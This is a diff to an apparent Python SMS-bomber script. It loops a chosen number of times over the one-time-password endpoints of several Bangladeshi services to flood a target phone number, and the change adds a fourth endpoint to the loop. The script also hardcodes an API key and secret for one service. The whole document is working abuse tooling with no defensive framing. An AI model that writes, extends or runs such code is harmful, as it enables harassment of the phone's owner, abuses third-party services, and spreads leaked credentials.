@@ -31,22 +31,30 @@ data1 = "phone="+number
 
 #2 
 
-url = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"
+daktar = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"
 
 headers2 = CaseInsensitiveDict()
 headers2["Content-Type"] = "application/x-www-form-urlencoded"
 headers2["Content-Length"] = "0"
 
 #3 
-api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+bio="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
 
+#4
+
+quiz = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
+
+headers3 = CaseInsensitiveDict()
+headers3["Content-Type"] = "application/x-www-form-urlencoded"
+
+data3 = "phone="+number
 
 print(G + "SMS Sending...")
 sleep(1)
 for j in range(amount):
-    resp = requests.post(binge1, headers=headers1, data=data1) 
-    resp1 = requests.post(url, headers=headers2)
-    requests.get(api)
-        
+    resp = requests.post(binge1, headers=headers1, data=data1)
+    resp1 = requests.post(daktar, headers=headers2)
+    requests.get(bio)
+    resp2 = requests.post(quiz, headers=headers3, data=data3)
     print("")
     print(G + "[✓] "+str(j+1)+" SMS Sent Successful...")
